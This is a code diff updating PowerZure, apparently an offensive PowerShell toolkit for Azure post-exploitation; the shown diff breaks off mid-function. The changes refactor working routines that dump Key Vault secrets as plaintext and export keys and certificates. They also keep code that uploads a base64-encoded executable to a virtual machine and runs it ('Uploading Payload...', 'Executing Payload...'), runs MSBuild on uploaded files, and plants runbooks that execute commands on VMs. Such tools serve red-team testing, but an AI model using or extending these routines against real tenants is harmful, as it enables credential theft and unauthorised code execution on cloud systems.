@@ -1,6 +1,107 @@
-﻿Set-ExecutionPolicy Bypass
-Set-Item Env:\SuppressAzurePowerShellBreakingChangeWarnings "true"
+﻿If(-not (Get-Module -ListAvailable -Name Az.Accounts)){
+    Write-Warning "PowerZure imported, but Az.Accounts was not found. Run Test-PowerZureDependency for details."
+}
 
+function ConvertFrom-SecureStringToken
+{
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$false,ValueFromPipeline=$true)][AllowNull()][Object]$Token = $null)
+
+    Process {
+        If($null -eq $Token){
+            return $null
+        }
+
+        If($Token -is [System.Security.SecureString]){
+            $BSTR = [System.IntPtr]::Zero
+            Try {
+                $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Token)
+                [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($BSTR)
+            }
+            Finally {
+                If($BSTR -ne [System.IntPtr]::Zero){
+                    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
+                }
+            }
+        }
+        else{
+            [String]$Token
+        }
+    }
+}
+
+function Invoke-GraphRequestPaged
+{
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$true)][String]$Uri,
+    [Parameter(Mandatory=$false)][Hashtable]$Headers = @{},
+    [Parameter(Mandatory=$false)][String]$Method = 'GET',
+    [Parameter(Mandatory=$false)][AllowNull()][Object]$Body = $null,
+    [Parameter(Mandatory=$false)][ValidateRange(1, [Int32]::MaxValue)][Int32]$MaximumPages = [Int32]::MaxValue)
+
+    $CurrentUri = $Uri
+    $PageCount = 0
+    $Values = New-Object System.Collections.ArrayList
+
+    while($CurrentUri -and ($PageCount -lt $MaximumPages)){
+        $RequestParams = @{
+            Uri = $CurrentUri
+            Method = $Method
+            Headers = $Headers
+        }
+
+        If($null -ne $Body){
+            $RequestParams.Body = $Body
+        }
+
+        $Response = Invoke-RestMethod @RequestParams
+        $PageCount++
+
+        If($Response.PSObject.Properties.Name -notcontains 'value'){
+            return $Response
+        }
+
+        ForEach($Item in $Response.value){
+            [void]$Values.Add($Item)
+        }
+
+        If($Response.PSObject.Properties.Name -contains '@odata.nextLink'){
+            $CurrentUri = $Response.'@odata.nextLink'
+            $Method = 'GET'
+            $Body = $null
+        }
+        else{
+            $CurrentUri = $null
+        }
+    }
+
+    $Values.ToArray()
+}
+
+function Get-AzureKeyVaultSecretPlainText
+{
+    [CmdletBinding()]
+    Param(
+    [Parameter(Mandatory=$true)][String]$VaultName,
+    [Parameter(Mandatory=$true)][String]$Name)
+
+    $SecretCommand = Get-Command Get-AzKeyVaultSecret -ErrorAction Stop
+    If($SecretCommand.Parameters.ContainsKey('AsPlainText')){
+        return Get-AzKeyVaultSecret -VaultName $VaultName -Name $Name -AsPlainText
+    }
+
+    $Secret = Get-AzKeyVaultSecret -VaultName $VaultName -Name $Name
+    If($null -ne $Secret.SecretValueText){
+        return $Secret.SecretValueText
+    }
+    If($Secret.SecretValue -is [System.Security.SecureString]){
+        return ConvertFrom-SecureStringToken -Token $Secret.SecretValue
+    }
+
+    $Secret.SecretValue
+}
 
 function Get-AzureToken
 {
@@ -32,7 +133,8 @@ function Get-AzureToken
     If($AAD){$token = Get-AzAccessToken -ResourceTypeName AadGraph}
     If($REST){$token = Get-AzAccessToken}
     If($Graph){$token = Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com/"}
-    $Headers.Add("Authorization","Bearer $($token.token)")    
+    $TokenValue = ConvertFrom-SecureStringToken -Token $token.token
+    $Headers.Add("Authorization","Bearer $TokenValue")    
     $Headers
 }
 
@@ -57,8 +159,7 @@ function Get-AzureCurrentUser
         }
 		$user = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/me'
 		$userid=$user.id
-        $MembershipsReq = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$userid/memberOf" 
-        $Memberships = $MembershipsReq.value
+        $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/users/$userid/memberOf"
         $Groups = New-Object System.Collections.ArrayList
         $AADRoles = New-Object System.Collections.ArrayList
         ForEach ($Membership in $Memberships){
@@ -90,6 +191,56 @@ function Get-AzureCurrentUser
     else{
 	Write-Error "Please login with Connect-AzAccount" -Category ConnectionError
     }  
+	}
+
+function Test-PowerZureDependency
+{
+<#
+.SYNOPSIS
+    Checks local PowerZure dependencies and login state.
+#>
+    [CmdletBinding()]
+    Param()
+
+    $Results = New-Object System.Collections.ArrayList
+    $Version = $PSVersionTable.PSVersion
+    $PowerShellOk = $Version -ge [Version]'5.1'
+    $PowerShellMessage = If($PowerShellOk){"PowerShell $Version is supported."}else{"Az requires at least PowerShell 5.1."}
+    If(!$PowerShellOk){Write-Warning $PowerShellMessage}
+    [void]$Results.Add([PSCustomObject]@{
+        Check = 'PowerShellVersion'
+        Passed = $PowerShellOk
+        Message = $PowerShellMessage
+    })
+
+    $AzAccounts = Get-Module -Name Az.Accounts -ListAvailable
+    $AzAccountsOk = [bool]$AzAccounts
+    $AzAccountsMessage = If($AzAccountsOk){"Az.Accounts is available."}else{"Az.Accounts is not installed. Install the Az module before using PowerZure Azure operations."}
+    If(!$AzAccountsOk){Write-Warning $AzAccountsMessage}
+    [void]$Results.Add([PSCustomObject]@{
+        Check = 'Az.Accounts'
+        Passed = $AzAccountsOk
+        Message = $AzAccountsMessage
+    })
+
+    $GetAzContext = Get-Command Get-AzContext -ErrorAction SilentlyContinue
+    If($GetAzContext){
+        $Context = Get-AzContext -ErrorAction SilentlyContinue
+        $LoginOk = [bool]$Context
+        $LoginMessage = If($LoginOk){"Connected to Azure as $($Context.Account)."}else{"No active Azure context. Run Connect-AzAccount before using Azure operations."}
+    }
+    else{
+        $LoginOk = $false
+        $LoginMessage = "Get-AzContext is unavailable because Az.Accounts is not loaded."
+    }
+    If(!$LoginOk){Write-Warning $LoginMessage}
+    [void]$Results.Add([PSCustomObject]@{
+        Check = 'AzureContext'
+        Passed = $LoginOk
+        Message = $LoginMessage
+    })
+
+    $Results
 }
 
 function Invoke-PowerZure
@@ -112,43 +263,7 @@ function Invoke-PowerZure
 
     If($Checks)
     {
-            $ErrorActionPreference = "Stop"
-            $Version = $PSVersionTable.PSVersion.Major
-            If ($Version -lt 5)
-            {
-                Write-Host "Az requires at least PowerShell 5.1"
-                Exit
-            }
-            #Module Check
-            $Modules = Get-InstalledModule
-            if ($Modules.Name -notcontains 'Az.Accounts')
-            {
-	            Write-host "Install Az PowerShell Module?" -ForegroundColor Yellow 
-                $Readhost = Read-Host " ( y / n ) " 
-                if ($ReadHost -eq 'y' -or $Readhost -eq 'yes') 
-                {
-	                Install-Module -Name Az -AllowClobber -Scope CurrentUser
-	                $Modules = Get-InstalledModule       
-		            if ($Modules.Name -contains 'Az.Accounts')
-		            {
-			            Write-Host "Successfully installed Az module. Please open a new PowerShell window and re-import PowerZure to continue" -ForegroundColor Yellow                      
-		            }
-                }
-	
-	            if ($ReadHost -eq 'n' -or $Readhost -eq 'no') 
-	            {
-		            Write-Host "Az PowerShell not installed, PowerZure cannot operate without this module." -ForegroundColor Red
-                    Exit
-	            }
-            }
-            #Login Check
-            $APSUser = Get-AzContext
-            if(!$APSUser){
-            Write-Error "Please login with Connect-AzAccount" -Category ConnectionError
-            Pause
-            Exit
-            }
-
+            Test-PowerZureDependency
     }
      
     if($h -eq $true)
@@ -244,8 +359,6 @@ Write-Host @'
 		}            
 }
 
-Invoke-PowerZure -Checks -Banner
-
 function Set-AzureSubscription
 {
 <# 
@@ -260,7 +373,15 @@ function Set-AzureSubscription
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false,HelpMessage='Enter a subscription ID. Try Show-AzureCurrentUser to see a list of subscriptions')][String]$Id = $null) 
-    $subs = Get-AzSubscription	
+    $subs = Get-AzSubscription
+    If($Id){
+        $choice = $subs | Where-Object {$_.Id -eq $Id}
+        If(!$choice){
+            Write-Error "Subscription '$Id' was not found." -Category ObjectNotFound
+            return
+        }
+        return Set-AzContext -SubscriptionId $choice.Id
+    }
     Write-Host "Select a subscription to choose as the default subscription:" -ForegroundColor Yellow
     Write-Host "" 
     $i=1
@@ -289,12 +410,11 @@ function Get-AzureRoleMember
     Param(
     [Parameter(Mandatory=$True)][String]$Role = $null)
     $Headers = Get-AzureToken -Graph
-    $rolesreq = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/directoryRoles'
-    $roles = $rolesreq.value
+    $roles = Invoke-GraphRequestPaged -Headers $Headers -Uri 'https://graph.microsoft.com/beta/directoryRoles'
     $roledata = $roles | Where-Object {$_.displayName -eq $Role}
     $id = $roledata.id
-    $membersreq = Invoke-RestMethod -Headers $Headers -Uri https://graph.microsoft.com/beta/directoryRoles/$id/members
-    $membersreq.value | Select-Object -Property '@odata.type', userPrincipalName, id
+    $members = Invoke-GraphRequestPaged -Headers $Headers -Uri https://graph.microsoft.com/beta/directoryRoles/$id/members
+    $members | Select-Object -Property '@odata.type', userPrincipalName, id
 
 }
 
@@ -332,8 +452,7 @@ function Get-AzureUser
                 $obj = New-Object -TypeName psobject
 			    $userid = $user.id
                 $userdata = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$userid" 
-                $MembershipsReq = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$userid/memberOf" 
-                $Memberships = $MembershipsReq.value
+                $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/users/$userid/memberOf"
                 $Groups = New-Object System.Collections.ArrayList
                 $EntraRoles = New-Object System.Collections.ArrayList
                 ForEach ($Membership in $Memberships){
@@ -363,8 +482,7 @@ function Get-AzureUser
 	    $userdata = Get-AzADUser -UserPrincipalName $Username
         $userid = $userdata.Id
         $userdata = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$userid" 
-        $MembershipsReq = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$userid/memberOf" 
-        $Memberships = $MembershipsReq.value
+        $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/users/$userid/memberOf"
         $Groups = New-Object System.Collections.ArrayList
         $EntraRoles = New-Object System.Collections.ArrayList
         ForEach ($Membership in $Memberships){
@@ -388,8 +506,7 @@ function Get-AzureUser
     If($Id){
 	    $obj = New-Object -TypeName psobject
 	    $userdata = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$id" 
-        $MembershipsReq = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$id/memberOf" 
-        $Memberships = $MembershipsReq.value
+        $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/users/$id/memberOf"
         $Groups = New-Object System.Collections.ArrayList
         $EntraRoles = New-Object System.Collections.ArrayList
         ForEach ($Membership in $Memberships){
@@ -422,8 +539,7 @@ function Get-AzureUser
         }
 	    $obj = New-Object -TypeName psobject
 	    $userdata = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$id" 
-        $MembershipsReq = Invoke-RestMethod -headers $Headers -uri "https://graph.microsoft.com/beta/users/$id/memberOf" 
-        $Memberships = $MembershipsReq.value
+        $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/users/$id/memberOf"
         $Groups = New-Object System.Collections.ArrayList
         $EntraRoles = New-Object System.Collections.ArrayList
         ForEach ($Membership in $Memberships){
@@ -468,8 +584,7 @@ function Get-AzureGroupMember
     $id = $groupdata.id   
     }
     $Headers = Get-AzureToken -Graph  
-	$membersREQ = Invoke-RESTMethod -uri https://graph.microsoft.com/beta/groups/$id/members -Headers $Headers
-    $membersREQ.value
+	Invoke-GraphRequestPaged -Uri https://graph.microsoft.com/beta/groups/$id/members -Headers $Headers
 }
 
 function Add-AzureGroupMember
@@ -576,20 +691,19 @@ function Get-AzureTarget
             $id=$Context.Acccount.id
         }
     }
-    $Memberships = Invoke-RestMethod -Headers $Headers -Uri https://graph.microsoft.com/v1.0/users/$Id/MemberOf
-    $gids = $Memberships.value.id 
+    $Memberships = Invoke-GraphRequestPaged -Headers $Headers -Uri https://graph.microsoft.com/v1.0/users/$Id/MemberOf
+    $gids = $Memberships.id
     $Headers.Add('ConsistencyLevel','eventual')
     $appcount = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/applications/$count'
     If($AppCount -gt 100){
         $prompt = Read-Host "There are $AppCount Applications, this may take awhile. Do you want to continue? [Y/N]"
         If($prompt -match 'y'){
-            $appdata = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/applications'
-	        $apps = $appdata.value
+            $apps = Invoke-GraphRequestPaged -Headers $Headers -Uri 'https://graph.microsoft.com/beta/applications'
 	        ForEach($app in $apps){   
                 $appobj = New-Object -TypeName psobject 
                 $appid = $app.id
-                $OwnedApps = Invoke-RestMethod -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$appid/owners"
-                $OwnedByUser=$OwnedApps.value | Where-Object {$_.userPrincipalName -eq $upn}
+                $OwnedApps = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$appid/owners"
+                $OwnedByUser=$OwnedApps | Where-Object {$_.userPrincipalName -eq $upn}
                 $coll = New-Object System.Collections.ArrayList
 		        If($OwnedByUser)
 		        {       
@@ -602,13 +716,12 @@ function Get-AzureTarget
         else{}
     }
     else{
-        $appdata = Invoke-RestMethod -Headers $Headers -Uri 'https://graph.microsoft.com/beta/applications'
-	    $apps = $appdata.value
+        $apps = Invoke-GraphRequestPaged -Headers $Headers -Uri 'https://graph.microsoft.com/beta/applications'
 	    ForEach($app in $apps){   
             $appobj = New-Object -TypeName psobject 
             $appid = $app.id
-            $OwnedApps = Invoke-RestMethod -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$appid/owners"
-            $OwnedByUser=$OwnedApps.value | Where-Object {$_.userPrincipalName -eq $upn}
+            $OwnedApps = Invoke-GraphRequestPaged -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$appid/owners"
+            $OwnedByUser=$OwnedApps | Where-Object {$_.userPrincipalName -eq $upn}
             $coll = New-Object System.Collections.ArrayList
 		    If($OwnedByUser)
 		    {       
@@ -743,12 +856,12 @@ function Get-AzureKeyVaultContent
 			$Secrets = Get-AzKeyVaultSecret -VaultName $vaultsname
 			ForEach($Secret in $Secrets)
 			{
-				$Value = Get-AzKeyVaultSecret -VaultName $vaultsname -name $Secret.name
+				$Value = Get-AzureKeyVaultSecretPlainText -VaultName $vaultsname -Name $Secret.name
 
 				$obj = New-Object -TypeName psobject	
 				$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
-				$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
-				$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
+				$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value
+				$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Secret.ContentType
 				$obj
 			}
 		}
@@ -760,12 +873,12 @@ function Get-AzureKeyVaultContent
 
 		ForEach($Secret in $Secrets)
 		{
-			$Value = Get-AzKeyVaultSecret -VaultName $vaultname -name $Secret.name
+			$Value = Get-AzureKeyVaultSecretPlainText -VaultName $vaultname -Name $Secret.name
 
 			$obj = New-Object -TypeName psobject	
 			$obj | Add-Member -MemberType NoteProperty -Name SecretName -Value $Secret.Name
-			$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value.SecretValueText
-			$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Value.ContentType
+			$obj | Add-Member -MemberType NoteProperty -Name SecretValue -Value $Value
+			$obj | Add-Member -MemberType NoteProperty -Name ContentType -Value $Secret.ContentType
 			$obj
 		}
 	}
@@ -804,7 +917,7 @@ function Export-AzureKeyVaultContent
 	
 	If($Type -eq 'Key')
 	{
-		$Path = $OutFilePath + '\key.pem'
+		$Path = Join-Path $OutFilePath 'key.pem'
 		$Export = Get-AzKeyVaultKey -VaultName $VaultName -KeyName $Name -OutFile $Path
 		If($Export)
 		{
@@ -817,16 +930,16 @@ function Export-AzureKeyVaultContent
 	}
 	If($Type -eq 'Certificate')
 	{
-		$Path = $OutFilePath + '\Cert.pfx'
+		$Path = Join-Path $OutFilePath 'Cert.pfx'
 		$cert = Get-AzKeyVaultCertificate -VaultName $Vaultname -Name $Name
-		$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $cert.Name
-		$secretByte = [Convert]::FromBase64String($secret.SecretValueText)
+		$secret = Get-AzureKeyVaultSecretPlainText -VaultName $vaultName -Name $cert.Name
+		$secretByte = [Convert]::FromBase64String($secret)
 		$x509Cert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2
 		$x509Cert.Import($secretByte, "", "Exportable,PersistKeySet")
 		$type = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx
 		$pfxFileByte = $x509Cert.Export($type, $password)
 		[System.IO.File]::WriteAllBytes("$Path", $pfxFileByte)
-		$test = ls C:\temp\cert.pfx
+		$test = ls $Path
 		If($test)
 		{
 			Write-Host "Successfully exported Certificate to $path" -Foregroundcolor Green
@@ -1089,25 +1202,26 @@ function Invoke-AzureRunCommand
     {
         $details = Get-AzVM -Name $VMName
 
-        If($Command)
-        {
+	        If($Command)
+	        {
+	            $TempPath = [System.IO.Path]::GetTempPath()
 
-            If($details.OSProfile.WindowsConfiguration)
-            {
-                $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-                $path = $new.DirectoryName + '\' + $new.Name  
-                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-                $result.value.Message
-                rm $path
+	            If($details.OSProfile.WindowsConfiguration)
+	            {
+	                $new = New-Item -Path (Join-Path $TempPath "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $Command -Force
+	                $path = $new.FullName  
+	                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	                $result.value.Message
+	                rm $path
 
-            }
-            If($details.OSProfile.LinuxConfiguration)
-            {
-                $new = New-Item -Name "LinuxDiagnosticTest.sh" -ItemType "file" -Value $Command
-                $path = $new.DirectoryName + '\' + $new.Name  
-                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
-                $result.value.Message
-                rm $path
+	            }
+	            If($details.OSProfile.LinuxConfiguration)
+	            {
+	                $new = New-Item -Path (Join-Path $TempPath "LinuxDiagnosticTest.sh") -ItemType "file" -Value $Command
+	                $path = $new.FullName  
+	                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
+	                $result.value.Message
+	                rm $path
             }            
         }
         If($Script)
@@ -1150,21 +1264,23 @@ function Invoke-AzureRunProgram
     [Parameter(Mandatory=$true)][String]$File = $null,
     [Parameter(Mandatory=$true)][String]$VMName = $null)
 
-    if($VMName -and $File -match '\\')
-    {
-        $details = Get-AzVM -Name $VMName
-        If($details.OSProfile.WindowsConfiguration)
-        {
-            $ByteArray = [System.IO.File]::ReadAllBytes($File)
-            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
-            Write-Host "Uploading Payload..."
-			$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
-			$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
-            $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $command -Force
-            $path = $new.DirectoryName + '\' + $new.Name  
-			Write-Host "Executing Payload..."
-            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-            $result.value.Message 
+    if($VMName -and [System.IO.Path]::IsPathFullyQualified($File))
+	    {
+	        $details = Get-AzVM -Name $VMName
+	        If($details.OSProfile.WindowsConfiguration)
+	        {
+	            $TempPath = [System.IO.Path]::GetTempPath()
+	            $UploadPath = Join-Path $TempPath "temp.ps1"
+	            $ByteArray = [System.IO.File]::ReadAllBytes($File)
+	            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File $UploadPath #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
+	            Write-Host "Uploading Payload..."
+				$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $UploadPath -verbose
+				$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
+	            $new = New-Item -Path (Join-Path $TempPath "WindowsDiagnosticTest.ps1") -ItemType "file" -Value $command -Force
+	            $path = $new.FullName  
+				Write-Host "Executing Payload..."
+	            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	            $result.value.Message 
             rm $path           
         }
 
@@ -1174,7 +1290,7 @@ function Invoke-AzureRunProgram
             $result.value.Message
         }       
     }
-    elseif(!$VMName -or $File -notmatch '\\')
+    elseif(!$VMName -or -not [System.IO.Path]::IsPathFullyQualified($File))
     { 
         Write-Host "-File must contain the full path to the file" -ForegroundColor Red
         Write-Host "Usage: Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe" -ForegroundColor Red
@@ -1201,13 +1317,13 @@ function Invoke-AzureRunMSBuild
 
     $details = Get-AzVM -Name $VMName
     $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $File -verbose
-    If($upload.Value)
-    {
-        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
-        $new = New-Item -Name "WindowsDiagnosticMSBuild.ps1" -ItemType "file" -Value $Command -Force
-        $path = $new.DirectoryName + '\' + $new.Name  
-        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-        $run.value.Message 
+	    If($upload.Value)
+	    {
+	        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
+	        $new = New-Item -Path (Join-Path ([System.IO.Path]::GetTempPath()) "WindowsDiagnosticMSBuild.ps1") -ItemType "file" -Value $Command -Force
+	        $path = $new.FullName  
+	        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
+	        $run.value.Message 
         rm $path
     }
 }
@@ -1240,23 +1356,25 @@ function Invoke-AzureCommandRunbook
     $ResourceGroup = $AA.ResourceGroupName
     $VMResourceGroup = $OS.ResourceGroupName
     $Modules = Get-AzAutomationModule -ResourceGroupName $ResourceGroup -AutomationAccountName $automationaccount
-    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
-    {
-	New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
-    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
-    }
-	If($OS.OSProfile.WindowsConfiguration)
-	{
-		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		$data7 = '$z.Value[0].Message' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
-		Write-Host "Uploading Runbook..." -ForegroundColor Green
-		Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
+	    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
+	    {
+		New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
+	    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
+	    }
+	    $TempPath = [System.IO.Path]::GetTempPath()
+		If($OS.OSProfile.WindowsConfiguration)
+		{
+			$RunbookPath = Join-Path $TempPath 'AzureAutomationTutorialPowerShell.ps1'
+			$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append $RunbookPath
+			$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append $RunbookPath
+			$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append $RunbookPath
+			$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append $RunbookPath
+			$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append $RunbookPath
+			$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append $RunbookPath
+			$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append $RunbookPath
+			$data7 = '$z.Value[0].Message' | Out-File -Append $RunbookPath
+			Write-Host "Uploading Runbook..." -ForegroundColor Green
+			Import-AzAutomationRunbook -Path $RunbookPath -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
 		Write-Host "Publishing Runbook..." -ForegroundColor Green
 		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	| Out-Null
 		Write-Host "Starting Runbook..." -ForegroundColor Green
@@ -1275,22 +1393,23 @@ function Invoke-AzureCommandRunbook
 
 		}
 		$timer.Stop()
-		$value
-		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
-		rm AzureAutomationTutorialPowerShell.ps1
-	}
-	else
-	{
-		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append BashAutomationTutorial.sh
-		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append BashAutomationTutorial.sh
-		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append BashAutomationTutorial.sh
-		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append BashAutomationTutorial.sh
-		$data4 = 'New-Item test.sh' | Out-File -Append BashAutomationTutorial.sh
-		$data5 = "echo $Command >> test.sh" | Out-File -Append BashAutomationTutorial.sh
